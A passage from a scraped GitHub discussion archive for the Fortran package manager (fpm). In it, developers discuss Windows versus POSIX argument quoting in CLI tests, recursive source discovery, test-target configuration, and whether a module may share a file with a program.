                    "text": "It does indeed work, see: e0f9499 and the corresponding Windows test:\nSTART:  TEST 17 CMD=test proj1 p2 project3 --release -- arg1 -x \"and a long one\"\n arguments seen directly by program\n0[test]\n0[proj1]\n0[p2]\n0[project3]\n0[--release]\n0[--]\n0[arg1]\n0[-x]\n0[and a long one]\n\n\nNote, j is the counter for the loop and i used uninitialized here, therefore we get zeros instead of useful numbers:\n\n  \n    \n      fpm/fpm/test/cli_test/cli_test.f90\n    \n    \n        Lines 168 to 171\n      in\n      af6fa0d\n    \n    \n    \n    \n\n        \n          \n           do j=1,command_argument_count() \n        \n\n        \n          \n              call get_command_argument(number=j,value=big_argument,length=ilen) \n        \n\n        \n          \n              write(*,'(*(g0))')i,'[',big_argument(:ilen),']' \n        \n\n        \n          \n           enddo \n        \n    \n  \n\n\n\n\nThe only drawback is that the CLI will fail consistently for all OS, which might look like a step back on first sight. The problem is that the namelist is reading single quotes over double quotes, and therefore mismatches the simple equals test at\n\n  \n    \n      fpm/fpm/test/cli_test/cli_test.f90\n    \n    \n         Line 126\n      in\n      af6fa0d\n    \n    \n    \n    \n\n        \n          \n           call test_test('ARGS',act_args.eq.args) \n        \n    \n  \n\n\nwith the input\n-'arg1' -x 'and a long one'\n+\"arg1\" -x \"and a long one\"\nI tried to fix it by changing the delim argument for the namelist IO, but this doesn't help."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-25 10:52:47+00:00",
                    "text": "I was intrigued by this and therefore (a bit of procrastination ;)) I\nconcocted a small test program and ran that on the following platforms:\n\n   - Linux (gfortran and Intel Fortran)\n   - plain Windows (Intel Fortran)\n   - Cygwin (gfortran)\n   - MinGW (gfortran)\n\nI used the following commands:\n\ncmdline.exe A B C D\ncmdline.exe 'A B C D'\ncmdline.exe \"A B C D\"\ncmdline.exe '*.f90'\ncmdline.exe \"*.f90\"\n\nThe results are, well, interesting. The details are contained in the\nattached zip-file (tstcmdline is a simple shell script, rename it to\ntestcmdline.bat for Windows - gmail did not accept in the zip-file).\n\nThe short message: Linux and Cygwin essentially work in the same way, MinGW\nexpands the file mask in the fourth command and Windows  and MinGw do not\ngroup on  apostrophes, only on quotation marks.\n\nOp vr 25 sep. 2020 om 11:43 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n *@LKedward* approved this pull request.\n\n Thanks again @urbanjost <https://github.com/urbanjost>. This looks good.\n +1 to merge so that #188 <#188>\n can move forward with review.\n Please open an issue to document the windows command line problems when\n you get a chance.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#182 (review)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR6AS7SPKQMOTYIPQFDSHRQ3VANCNFSM4RT2CWCQ>\n ."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 13:30:52+00:00",
                    "text": "@awvwgk , if I understand correctly, the namelist read (or maybe write) does not preserve quotes in a string? So in order to preserve a string round-trip, one must use single quotes (')?\n@awvwgk and @arjenmarkus, this behavior matches what I believed was happening, Windows cmd environment (and I think batch behaves the same way) does not respect single quotes. Therefore, the CLI was properly parsing what Windows cmd had provided to it as the arguments, it just wasn't matching what the test expected.\nDoes this effectively lead us to contradicting requirements? The test requires the use of single quotes to preserve the arguments round trip through namelist, but Windows requires the use of double quotes to preserve the string as being a single argument. Is there a workaround we'd like to try and implement before merging, or should we go ahead and merge and just leave this as a known issue?\nThanks @awvwgk and @arjenmarkus for your help fleshing this out."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 14:21:16+00:00",
                    "text": "@awvwgk , if I understand correctly, the namelist read (or maybe write) does not preserve quotes in a string?\n\nThe short, but incorrect, answer is yes. The correct answer is that the namelist write step does not know about the type of quotation due to the recursive execution of the test binary and therefore cannot preserve anything.\n\nSo in order to preserve a string round-trip, one must use single quotes (')?\n\nNo, this is actually the wrong conclusion. The assumption that we can use single quotes (') in a cross platform application is wrong. Also the assumption that we can compare a command line by equality in the testsuite is not correct.\n\n@awvwgk and @arjenmarkus, this behavior matches what I believed was happening, Windows cmd environment (and I think batch behaves the same way) does not respect single quotes. Therefore, the CLI was properly parsing what Windows cmd had provided to it as the arguments, it just wasn't matching what the test expected.\n\nThat is indeed correct. Single quotes are officially not supported to escape arguments in PowerShell and CMD on Windows. Note that testing cygwin on Windows introduces a POSIX shell, which will mitigate the problem, therefore cygwin is consistent with OSX and Ubuntu in the testsuite.\n\nDoes this effectively lead us to contradicting requirements?\n\nNo, the assumption for writing the test suite is assuming a POSIX shell and relying on an implementation detail of the namelist IO with GCC (and possibly other compilers as well) to always use single quotation marks.\n\nIs there a workaround we'd like to try and implement before merging, or should we go ahead and merge and just leave this as a known issue?\n\nMy opinion on this is that the implementation is not portable and should be fixed before being merged. I gave it a try already, but I cannot find a simple way to fix the quotation mark issue since this information is just lost in the shell execution and the subsequent usage of namelist IO."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 16:27:02+00:00",
                    "text": "Just a point of clarification, which part of \"the implementation is not portable\"? If it is just the tests that are not portable, I think merging now and finding a different testing method later is acceptable. The other tests are sufficiently demonstrating the CLI to be working properly (or at least sufficiently for current requirements), and even the non-portable tests are demonstrating that it works under environments that preserve the intended behavior of the tests.\nIn my opinion, I don't think the CLI should be required to recombine \"erroneously split\" arguments. I think trying require a CLI to \"fix\" \"improperly\" split command line arguments in Windows environments would be akin to trying to ask it to \"fix\" \"improperly\" expanded glob (i.e. *.f90) arguments from a posix environment. It's just out of scope. It seems to me the current implementation is behaving as expected.\nUnless I missed something."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-25 17:18:46+00:00",
                    "text": "Yeah, the test suite is not portable.\nThe PR is already lengthy and we can probably fix this later, of course."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 19:31:26+00:00",
                    "text": "I have a change that I think satisfies all the suggest changes and makes a test case I believe will work on MSWindows and POSIX platforms for all but edge conditions, with a change that should allow handling the edge conditions in the future. The -- ARGS option is intriguingly difficult on and MSWindows box. I have a test case I am working on for the case where the arguments are all the printable ASCII characters and the results are \"interesting\" with % characters in particular on windows. Since in this case the shell should have expanded most of the problem characters when the fpm command itself was called I find it difficult to find any kind of typical usage that this version fails on so far.  I tried a simple rebase to avoid clobbering things again and apparently did not get the syntax right so I am hesitant to push this and it seems like a concensus is near. Should I just let this one lay aside for a moment and present this in #188 or I need help on how to make sure another push does not good changes out I am afraid. Suggestions?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 20:22:22+00:00",
                    "text": "So long as you made the commit on this branch, you should be able to run the commands\ngit pull --rebase\ngit push\n\nand it should work fine. If not I should be able to recover anything lost and get it sorted out."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 21:07:42+00:00",
                    "text": "Well that was interesting. It did not work that simply as I had followed some web pages earlier trying to get past some of the earlier issues that required me to try to try something more involved; and I was following some git directions and got some interesting messages and then my machine crashed and now all but the ubuntu test have been running a long time without completing. I am not going to try anything else."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-25 21:21:31+00:00",
                    "text": "Ok, that looks like it clobbered, pretty much everything. I'm going to force push back to the latest state I had. Any chance you could redo the the changes you made?"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 22:40:03+00:00",
                    "text": "Managed to break git(1). restoring from system backup. The web page seems to have a page from a previous file in the NEW PR that was never in the CLI branch."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-26 03:12:03+00:00",
                    "text": "The restore is complete, but need to take you up on that offer to reinstall you changes. I have no intention of changing it again unless there is something I do not see that did not restore."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 18:32:35+00:00",
                    "text": "I restored everything. One more time?\n\u2026\n     On 09/25/2020 5:21 PM Brad Richardson ***@***.***> wrote:\n\n\n\n\n     Ok, that looks like it clobbered, pretty much everything. I'm going to force push back to the latest state I had. Any chance you could redo the the changes you made?\n\n     \u2014\n     You are receiving this because you were mentioned.\n     Reply to this email directly, view it on GitHub #182 (comment) , or unsubscribe https://github.com/notifications/unsubscribe-auth/AHDWN3J5T44KP2XROUI3TDLSHUCWRANCNFSM4RT2CWCQ ."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 19:27:53+00:00",
                    "text": "It makes it clear to me that there are disadvantages to Fortran only supporting the equivalent of system(3c) and not the exec(3c) familiy of C routines. Being required to call the system and thus exposing any spawned command to the vagaries of the OS shell and subsequent expansion and globbing makes it much harder to write a reliably portable program using subprocesses; especially because of the number of variations in MSWindows where escaping with ^ is not always reliable, and sometimes \\ is used and that the program might be running in several environments with different parsing rules. Changing the M_CLI2 interface to \" instead of ' makes this reasonably portable without having to determine the OS, but staying with a pure Fortran solution (ie. without calling C) the best solution seems to not requote the parameters as M_CLI2 does in this case, but to use the values directly obtained from the get_command_arguments(3f) function and conditionally requote them based on the system being called by execute_system_command(3f) for outliers with special characters which I will try to capture as a remaining issue, but specifically specifying the DELIM for the sake of the NAMELIST group tests and changing to a \" from a ' seems to be doing a better job than many MSWindows commands and other packages. This experience helps justify the full round-trip test as only being exposed to the system parsing exposes the problem, on the bright side.\n\u2026\n     On 09/25/20I20 9:31 AM Brad Richardson ***@***.***> wrote:\n\n\n\n\n     @awvwgk https://github.com/awvwgk , if I understand correctly, the namelist read (or maybe write) does not preserve quotes in a string? So in order to preserve a string round-trip, one must use single quotes (')?\n\n     @awvwgk https://github.com/awvwgk and @arjenmarkus https://github.com/arjenmarkus , this behavior matches what I believed was happening, Windows cmd environment (and I think batch behaves the same way) does not respect single quotes. Therefore, the CLI was properly parsing what Windows cmd had provided to it as the arguments, it just wasn't matching what the test expected.\n\n     Does this effectively lead us to contradicting requirements? The test requires the use of single quotes to preserve the arguments round trip through namelist, but Windows requires the use of double quotes to preserve the string as being a single argument. Is there a workaround we'd like to try and implement before merging, or should we go ahead and merge and just leave this as a known issue?\n\n     Thanks @awvwgk https://github.com/awvwgk and @arjenmarkus https://github.com/arjenmarkus for your help fleshing this out.\n\n     \u2014\n     You are receiving this because you were mentioned.\n     Reply to this email directly, view it on GitHub #182 (comment) , or unsubscribe https://github.com/notifications/unsubscribe-auth/AHDWN3L5FB6GELSDPICF4H3SHSLR3ANCNFSM4RT2CWCQ ."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-27 20:32:37+00:00",
                    "text": "Despite the git related hiccups, this is now working (\ud83d\ude04), so I'm going to go ahead and merge. Thanks for all your effort on this @urbanjost"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-27 21:52:17+00:00",
                    "text": "Thank you!  Thanks everyone for all the support an suggestions\n\u2026\n     On 09/27/2020 4:32 PM Brad Richardson ***@***.***> wrote:\n\n\n\n\n     Despite the git related hiccups, this is now working (\ud83d\ude04), so I'm going to go ahead and merge. Thanks for all your effort on this @urbanjost https://github.com/urbanjost\n\n     \u2014\n     You are receiving this because you were mentioned.\n     Reply to this email directly, view it on GitHub #182 (comment) , or unsubscribe https://github.com/notifications/unsubscribe-auth/AHDWN3JG5ZMOEEQGA72736TSH6OPFANCNFSM4RT2CWCQ ."
                }
            ]
        },
        {
            "number": 181,
            "user": "urbanjost",
            "date": "2020-09-19 22:01:23+00:00",
            "title": "simple CLI interface for all commands using M_CLI2",
            "text": "An implimentation of a CLI interface based on the most\nrecent master for discussion with @everythingfunctional",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-19 23:08:26+00:00",
                    "text": "Thanks!\n\u2026\nOn Sat, Sep 19, 2020, at 5:01 PM, urbanjost wrote:\n An implimentation of a CLI interface based on the most\n recent master for discussion with @everythingfunctional\n <https://github.com/everythingfunctional>\n\n You can view, comment on, or merge this pull request online at:\n\n   #181\n\n Commit Summary\n\n  * simple CLI interface for all commands using M_CLI2\n File Changes\n\n  * *M* fpm/fpm.toml\n <https://github.com/fortran-lang/fpm/pull/181/files#diff-7b7f15ad033448e9fa834a26171257de> (3)\n  * *M* fpm/src/fpm.f90\n <https://github.com/fortran-lang/fpm/pull/181/files#diff-e235e41ae1a801d1ff11bfa3aa1ea6db> (133)\n  * *M* fpm/src/fpm_command_line.f90\n <https://github.com/fortran-lang/fpm/pull/181/files#diff-7fc26592b0babf0895d006b372f1ec37> (192)\n Patch Links:\n\n  * https://github.com/fortran-lang/fpm/pull/181.patch\n  * https://github.com/fortran-lang/fpm/pull/181.diff\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#181>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWDWKG2RRQMA37KSDADSGUS37ANCNFSM4RTICRKQ>."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-20 01:55:37+00:00",
                    "text": "It says it fails on a file that was a working file on windows that ends in \".f90.\".  I added the dot to keep it from being used, which worked on Linux.  I deleted the file, it is just fodder for a new demo. Interesting it picked up that file even though it did not end in \".f90\". Not sure if how the checks work; if it will pull a new dependency and run again or not."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-20 06:58:07+00:00",
                    "text": "Thanks @urbanjost. The error was a Windows/git error; it is illegal for a filename to end in a dot on Windows so the git checkout failed. I've rerun the checks and all seems fine now.\nI will look over this PR today"
                }
            ]
        },
        {
            "number": 180,
            "user": "LKedward",
            "date": "2020-09-19 12:57:38+00:00",
            "title": "Recursive source discovery",
            "text": "Updates list_files routine with capability to recursively discover files in subdirectories;\nadd_sources_from_dir now calls list_files in recursive mode;\nUpdates 'hello_complex' example package with additional module in subdirectory to demonstrate and test this.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-19 16:30:03+00:00",
                    "text": "Looks great, thanks!\n\u2026\nOn Sat, Sep 19, 2020, at 8:40 AM, Sebastian Ehlert wrote:\n\n\n ***@***.**** approved this pull request.\n\n Very nice, I did a quick check on `toml-f`, which is using a rather\n deep directory structure, and it was built correctly \ud83d\udc4d. The\n implementation also looks good to me.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#180 (review)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWGTIDTUYYFEU3F34WDSGSYGXANCNFSM4RTAJAFQ>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:39:45+00:00",
                    "text": "Thank you, @LKedward! Merging."
                }
            ]
        },
        {
            "number": 179,
            "user": "awvwgk",
            "date": "2020-09-18 22:25:57+00:00",
            "title": "Testing with fpm test",
            "text": "Since @milancurcic brought it up in #177 (comment), it might be worth to have a way to define unit tests within a test target, i.e. \u201cexport\u201d tests from our testing framework as test targets to fpm test. I am also thinking of tests that will require external resources, we cannot really define in a unit test.\nAn example is the consistency test of the version number specified in the fpm.toml, meson.build or CMakeLists.txt and the internal one in a *_version module. In this case we would either like to get the correct fpm.toml as argument and parse it or have the build system pass the version string as command line argument. The unit test without arguments will usually be useless. The alternative would be to generate the *_version module with configure_file from a template, but this is nothing we can do with fpm (yet).\nOther examples might be test targets requiring correctly set environment variables or test binaries that can run different tests depending on a test input file. The binary might even be an external program that takes an executable as input and provides it with input by some convention (i.e. STDIN) and expects a correct response (i.e. STDOUT or error code).\nI am facing four different test scenarios with toml-f, for which I am relying on the unit test framework of meson and it does a pretty decent job to orchestrate those different scenarios. Only one of them would be supported by fpm right now. Here are the test definitions for reference: https://github.com/toml-f/toml-f/blob/master/test/meson.build.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-22 02:27:08+00:00",
                    "text": "@awvwgk thanks for the idea. Can you give an example how it could look like from a user perspective for toml-f using fpm?\nI would prefer if things can somehow work automatically so that users don't have to code a file like https://github.com/toml-f/toml-f/blob/cb04d91e55872f390210a63c3468f168c0da4cbd/test/meson.build, which seems quite long. Is the problem in different dependencies for tests?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-22 08:12:40+00:00",
                    "text": "Let's assume fpm would support a configure_file like syntax, a hypothetical transcription of my test definitions for toml-f with fpm could look like this:\n# Check if the internal version number matches the package version number\n[[test]]\nname = \"tftest-version\"\nmain = \"version.f90\"\nsource-dir = \"test\"\n[[test.target]]\nargs = [\"@package-version@\"]  # returns entry from package%version\n\n# Check content of a local file (fpm.toml) for the version number\n# Note: this test is actually redundant for fpm, if the first case works,\n#       meson and CMake currently use this since fpm can't check itself\n[[test]]\nname = \"tftest-fpm\"\nmain = \"fpm.f90\"\nsource-dir = \"test\"\n[[test.target]]\n# given the current scope, the current source directory should be \"test\"\nargs = [\"@fpm-current-source-dir@/../fpm.toml\"]\n# alternatively, if we have a package scope, this might work:\n# args = [\"@fpm-source-dir@/fpm.toml\"]\n\n# This is already valid with fpm\n[[test]]\nname = \"tftester\"\nmain = \"tftest.f90\"\nsource-dir = \"test\"\n\n# Now the complicated part\n# Decoder test, check if the deserialization of TOML documents produces the correct data structures\n[[test]]\nname = \"toml2json\"\nmain = \"toml2json.f90\"\nsource-dir = \"test\"\n[[test.target]]\n# requires an external program to perform testing\nexecutable.find = \"toml-test\"\n# referencing of the test executable is required\nargs = [\n  \"-testdir\", \"@fpm-source-dir@/subprojects/toml-test\",\n  \"@fpm-current-binary-dir@/toml2json\",\n]\n[[test.target]]\nexecutable.find = \"toml-test\"\nargs = [\"@fpm-current-binary-dir@/toml2json\"]\n\n# Encoder test, check if the serialization of data structures produces correct TOML documents\n[[test]]\nname = \"json2toml\"\nmain = \"json2toml.f90\"\nsource-dir = \"test\"\n[[test.target]]\nexecutable.find = \"toml-test\"\nargs = [\"-encoder\", \"@fpm-current-binary-dir@/json2toml\"]\nCertainly, the test definitions won't get much shorted compared to the declarations in the meson.build of toml-f. I actually prefer to be explicit about the declarations.\nFor the sake of the discussion, we can ignore the second half of the tests for now, if they don't fit into fpm's scope of testing (I currently don't support them in CMake as well because they are a bit more involved and so far only meson is able to handle this test scenario gracefully).\nBut supporting the first two scenarios (tftest-version and tftest-fpm) in some way would be great."
                }
            ]
        },
        {
            "number": 178,
            "user": "LKedward",
            "date": "2020-09-18 11:07:31+00:00",
            "title": "Add more example packages",
            "text": "Adds: new example package for including c code;\nAdds: new example package for using submodules;\nAdds: README describing each example package and supported fpm version;\nFixes: parsing bug where submodule names were not added to modules_provided array;\nFixes: parsing bug where leading spaces were not removed from parsed strings.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 17:59:47+00:00",
                    "text": "\ud83d\udc4d from me. Do you agree on also adding this example package:\nmodule_in_program_source/\n  app/\n    main.f90\n  fpm.toml\n\nwhere main.f90 is:\nmodule greet_m\n  implicit none\n  character(*), parameter :: greeting = 'Hello, fpm!' \nend module greet_m\n\nprogram module_in_program_source\n  use greet_m, only: greeting\n  implicit none\n  print *, greeting\nend program module_in_program_source\nWe're supporting this implicitly without special care, but we should make sure to not break the support."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-18 18:30:34+00:00",
                    "text": "Thanks @milancurcic. Good point yes I agree, I'll add that example in too."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-18 19:36:46+00:00",
                    "text": "I'm not sure I agree that we do want to support having a module in the same file with a program. We don't support having multiple modules in one file. Is there a reason for wanting this capability?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-18 19:51:48+00:00",
                    "text": "For me it's convenience for toy programs;\nIt's valid Fortran;\nThere is existing production Fortran software that does this (multiple modules in one source file)\n\n\nWe don't support having multiple modules in one file.\n\nWe do, I just tried it. :)\nI get that many people may not care about this, but I think you need a strong argument to disallow valid code."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-18 20:03:08+00:00",
                    "text": "I similarly find it useful now and again to put a module and a program together for small supporting programs like tests, demos and benches. This is fairly common usage I believe.\nMy main quarrel with disallowing this, and other valid fortran layouts, is with the enforcement of design decisions on users by constraint. This is not the job of a build tool IMO.\nRegarding existing support, I believe it is supported to the extent that the module in question is not used by any other file."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-18 21:28:30+00:00",
                    "text": "I find it somewhat useful when tooling (if not the language itself) can at least discourage known, poor design decisions. Similar to the way most modern languages don't have a goto. But if there is sufficient desire, and some use cases where it would lead to better design, I'm ok with it. I don't know if that's the case, but I'm open to being shown some.\nAre there any other languages that allow multiple modules in one file?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-19 16:38:08+00:00",
                    "text": "I agree with Brad. But similarly I am for restricting the naming of modules to enforce directory structure, but if I recall correctly, Brad was against.\n\nThe fact that current codes use something is not a good argument because current codes would require some modifications anyway to compile with fpm.\n\nI think a good way forward is to restrict with an fpm.toml option (we can discuss whether the option should be on or off by default). That way we can satisfy both camps.\n\nI definitely would like an option in fpm to warn against non standard usage.\n\nHuge advantage of being strict is that it simplifies the available options, which makes it easier to understand other people's codebases.\n\u2026\nOn Fri, Sep 18, 2020, at 4:28 PM, Brad Richardson wrote:\n\n\n I find it somewhat useful when tooling (if not the language itself) can\n at least discourage known, poor design decisions. Similar to the way\n most modern languages don't have a `goto`. But if there is sufficient\n desire, and some use cases where it would lead to better design, I'm ok\n with it. I don't know if that's the case, but I'm open to being shown\n some.\n\n Are there any other languages that allow multiple modules in one file?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVXFLWYQYOSEHW5DLSGPGI3ANCNFSM4RR2MP5A>."
                },
                {
                    "user": "certik",
                    "date": "2020-09-19 16:39:54+00:00",
                    "text": "Regarding quick tests: \"fpm new\" will create you an executable with a module, properly in separate files, so I intend to use that.\n\u2026\nOn Sat, Sep 19, 2020, at 11:37 AM, Ond\u0159ej \u010cert\u00edk wrote:\n I agree with Brad. But similarly I am for restricting the naming of\n modules to enforce directory structure, but if I recall correctly, Brad\n was against.\n\n The fact that current codes use something is not a good argument\n because current codes would require some modifications anyway to\n compile with fpm.\n\n I think a good way forward is to restrict with an fpm.toml option (we\n can discuss whether the option should be on or off by default). That\n way we can satisfy both camps.\n\n I definitely would like an option in fpm to warn against non standard usage.\n\n Huge advantage of being strict is that it simplifies the available\n options, which makes it easier to understand other people's codebases.\n\n On Fri, Sep 18, 2020, at 4:28 PM, Brad Richardson wrote:\n >\n >\n > I find it somewhat useful when tooling (if not the language itself) can\n > at least discourage known, poor design decisions. Similar to the way\n > most modern languages don't have a `goto`. But if there is sufficient\n > desire, and some use cases where it would lead to better design, I'm ok\n > with it. I don't know if that's the case, but I'm open to being shown\n > some.\n >\n > Are there any other languages that allow multiple modules in one file?\n >\n > \u2014\n > You are receiving this because you are subscribed to this thread.\n > Reply to this email directly, view it on GitHub\n > <#178 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAAFAWHVXFLWYQYOSEHW5DLSGPGI3ANCNFSM4RR2MP5A>.\n >"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-19 18:04:32+00:00",
                    "text": "I agree with having fpm print a warning (recommendation, really) if it finds multiple modules or module + program in a source file.\nI don't like the idea of restricting this with an option because if you expressly don't want to do this, then you're already not writing code that needs to be restricted. Conversely, if the default is to restrict it, then having to add an option to enable it somewhat defeats the purpose of me using it for convenience.\nIf you're against a correct default behavior that is supported in the present and want to disable it as a feature, you need to convince others, not the other way around. \"known, poor design decisions\" is subjective and not meaningful without elaborating why."
                },
                {
                    "user": "certik",
                    "date": "2020-09-19 21:13:10+00:00",
                    "text": "Technically the main issue as I see it is that if we start with being restrictive, we can always relax the requirements later without breaking any existing fpm package. However, if we relax the requirements now, we can't easily make them more strict without breaking existing packages.\n\nRegarding the warning, I don't know if I would like to be getting warnings for things that are allowed. In other words, Milan, would you like to be getting warnings for modules in the same file as the main program?\n\nSummary: let's be very conservative with relaxing restrictions. It's a one way street.\n\u2026\nOn Sat, Sep 19, 2020, at 1:04 PM, Milan Curcic wrote:\n\n\n I agree with having fpm print a warning (recommendation, really) if it\n finds multiple modules or module + program in a source file.\n\n I don't like the idea of restricting this with an option because if you\n expressly don't want to do this, then you're already not writing code\n that needs to be restricted. Conversely, if the default is to restrict\n it, then having to add an option to enable it somewhat defeats the\n purpose of me using it for convenience.\n\n If you're against a correct default behavior that is supported in the\n present and want to disable it as a feature, you need to convince\n others, not the other way around. \"known, poor design decisions\" is\n subjective and not meaningful without elaborating why.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHVGF2O6K2SQWD4DPLSGTXDZANCNFSM4RR2MP5A>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-20 08:52:12+00:00",
                    "text": "Technically the main issue as I see it is that if we start with being restrictive, we can always relax the requirements later without breaking any existing fpm package.\n\nI don't think we should consider deferring this decision.\nI think Milan makes a very important point: having no restrictions does not affect those who want to conform to their own standard for layout, but enforcing restrictions does affect those who do not. By placing restrictions on otherwise valid Fortran you are enforcing one group's subjective preference on everyone.\n\nRegarding the warning, I don't know if I would like to be getting warnings for things that are allowed.\n\nThere are some situations where I learn to live with certain compiler warnings, because I know why those warnings exist and why I have chosen to ignore them. This would be the same in this case."
                },
                {
                    "user": "certik",
                    "date": "2020-09-20 12:47:01+00:00",
                    "text": "Note that this argument when followed to its logical conclusion would prevent us to impose any kind of \"default layout\" in fpm, because it is preventing valid code to compile.\n\nAre we allowing multiple modules or just one module together with the program? If multiple, it means we are also making a decision of not ever imposing the module naming convention based on the filename?\n\nThere are huge advantages that come from having a restrictive default layout. I want to make sure all the implication of this decision are understood.\n\nIf we make this decision, will it be warning by default, and you can turn off the warning in fpm.toml with an option? That actually would be fine with me.\n\u2026\nOn Sun, Sep 20, 2020, at 2:52 AM, Laurence Kedward wrote:\n\n\n > Technically the main issue as I see it is that if we start with being restrictive, we can always relax the requirements later without breaking any existing fpm package.\n\n I don't think we should consider deferring this decision.\n\n I think Milan makes a very important point: having no restrictions does\n not affect those who want to conform to their own standard for layout,\n but enforcing restrictions does affect those who do not. By placing\n restrictions on otherwise valid Fortran you are enforcing one group's\n subjective preference on everyone.\n\n > Regarding the warning, I don't know if I would like to be getting warnings for things that are allowed.\n\n There are some situations where I learn to live with certain compiler\n warnings, because I know why those warnings exist and why I have chosen\n to ignore them. This would be the same in this case.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEDC6BPNNUGYSS7II3SGW7ERANCNFSM4RR2MP5A>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-20 13:14:42+00:00",
                    "text": "If we make this decision, will it be warning by default, and you can turn off the warning in fpm.toml with an option?\n\nYes, a warning by default.\n\nThere are huge advantages that come from having a restrictive default layout.\n\nAre these advantages for fpm developers or advantages for fpm users? My argument is based on prioritising the latter over the former."
                },
                {
                    "user": "certik",
                    "date": "2020-09-20 13:33:42+00:00",
                    "text": "I am fine with warning by default.\n\nI think the advantages are for the users. I agree that is what we should prioritize.\n\nWe can discuss further at our monthly call. I think we have an agreement on this particular issue to move forward.\n\u2026\nOn Sun, Sep 20, 2020, at 7:14 AM, Laurence Kedward wrote:\n\n\n > If we make this decision, will it be warning by default, and you can turn off the warning in fpm.toml with an option?\n\n Yes, a warning by default.\n\n > There are huge advantages that come from having a restrictive default layout.\n\n Are these advantages for fpm developers or advantages for fpm users? My\n argument is based on prioritising the latter over the former.\n\n \u2014\n You are receiving this because you commented.\n Reply to this email directly, view it on GitHub\n <#178 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWGQ4B6K6KMAWOUBM6DSGX543ANCNFSM4RR2MP5A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-20 15:32:56+00:00",
                    "text": "Thanks @certik.\nPerhaps a nuanced but important point that may have been missed: I don't argue here for relaxing any restriction. I argue for including a test case of a pattern that is presently both permitted (within our planned restriction set) and working, rather than leaving it untested.\nI was assuming that the file/module layout and naming restriction we impose follows from #153 where we agreed that we will require the module name to be prefixed with package name. This helps prevent name collisions.\nI was also assuming that we don't anymore require the module name to be the same as the source file name. I don't think it does  anything for us given #153. Do you agree?\nSo, if we don't require the module name to be the same as the source file name, I see no practical reason to forbid module+program or multi-module in source file. However, if we do require it, then we can't do what I proposed in this thread.\nAs an afterthought, given #153 we should rename the modules in current example packages to reflect this (even though we're not enforcing it yet)."
                },
                {
                    "user": "certik",
                    "date": "2020-09-20 18:27:24+00:00",
                    "text": "My understanding was that we relaxed the name of the modules, but kept the door open if we wanted to make it strict again. With this change the door closes.\n\nI think the overall goal is for fpm to fully understand the project and to build it automatically.\n\nI think this change doesn't compromise this goal, so I think it's fine to relax restrictions.\n\nThe other goal is to make it easy to use a dependency. For that if we will not enforce module names based on directories, we could make a command \"fpm api PACKAGE\" that would summarize what modules the user can call and what is in them.\n\u2026\nOn Sun, Sep 20, 2020, at 9:33 AM, Milan Curcic wrote:\n\n\n Thanks @certik <https://github.com/certik>.\n\n Perhaps a nuanced but important point that may have been missed: I\n don't argue here for relaxing any restriction. I argue for including a\n test case of a pattern that is presently both permitted (within our\n planned restriction set) and working, rather than leaving it untested.\n\n I was assuming that the file/module layout and naming restriction we\n impose follows from #153\n <#153> where we agreed that\n we will require the module name to be prefixed with package name. This\n helps prevent name collisions.\n\n I was also assuming that we don't anymore require the module name to be\n the same as the source file name. I don't think it does anything for us\n given #153 <#153>. Do you\n agree?\n\n So, if we don't require the module name to be the same as the source\n file name, I see no practical reason to forbid module+program or\n multi-module in source file. However, if we do require it, then we\n can't do what I proposed in this thread.\n\n As an afterthought, given #153\n <#153> we should rename the\n modules in current example packages to reflect this (even though we're\n not enforcing it yet).\n\n \u2014\n You are receiving this because you were 